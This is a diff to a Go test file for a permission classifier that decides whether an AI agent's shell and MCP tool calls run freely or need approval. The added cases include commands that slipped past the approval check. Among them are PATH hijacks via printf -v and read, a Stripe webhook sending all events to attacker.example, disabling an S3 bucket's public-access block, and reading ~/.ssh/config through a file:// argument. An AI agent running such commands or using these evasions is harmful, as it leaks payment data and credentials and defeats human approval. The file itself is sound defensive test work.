@@ -70,7 +70,8 @@ func TestAdapterGolden(t *testing.T) {
 		{"stripe mcp list runs", mcp("stripe", "list_customers", nil), Allow, 13},
 		{"stripe mcp refund asks", mcp("stripe", "create_refund", map[string]any{"payment_intent": "pi_1"}), Ask, 7},
 		{"look-alike server name gets no adapter", mcp("evil-stripe-proxy", "list_customers", nil), Ask, 10},
-		{"stripe-mcp server name matches", mcp("stripe-mcp", "list_customers", nil), Allow, 13},
+		{"stripe-evil gets no adapter", mcp("stripe-evil", "list_customers", nil), Ask, 10},
+		{"exact stripe server name matches", mcp("stripe", "list_customers", nil), Allow, 13},
 		// Resend
 		{"resend send asks", sh("curl -X POST https://api.resend.com/emails -H 'Content-Type: application/json' -d @mail.json"), Ask, 7},
 		{"resend read runs", sh("curl https://api.resend.com/domains"), Allow, 13},
@@ -207,6 +208,15 @@ func TestReleaseReviewBypassesAsk(t *testing.T) {
 		"sort --compress-program=./x big.txt; aws sts get-caller-identity",
 		"aws cloudwatch put-metric-alarm --alarm-name a --namespace AWS/EC2 --metric-name CPUUtilization --threshold -1 --comparison-operator GreaterThanThreshold --alarm-actions arn:aws:lambda:us-east-1:1:function:f",
 		"aws s3api put-bucket-tagging --bucket b --tagging TagSet=[]",
+		// release review round 3
+		"printf -v PATH '%s' ./bin; aws sts get-caller-identity",
+		"printf -vPATH ./bin; aws sts get-caller-identity",
+		"read PATH <<< ./bin; aws sts get-caller-identity",
+		"stripe products create --name Example -d 'default_price_data[currency]=usd' -d 'default_price_data[unit_amount]=100'",
+		"stripe webhook_endpoints create --url https://attacker.example/hook --enabled-events '*'",
+		"aws cloudfront create-invalidation --distribution-id E123 --paths '/index.html'",
+		"aws ec2 create-snapshot --volume-id vol-0123456789abcdef0",
+		"aws s3api put-public-access-block --bucket b --public-access-block-configuration BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false",
 		// reviewed creates that read files outside the project
 		"aws cloudfront create-distribution --distribution-config file:///Users/test/.ssh/config",
 		"aws cloudfront create-distribution --distribution-config file://creds",
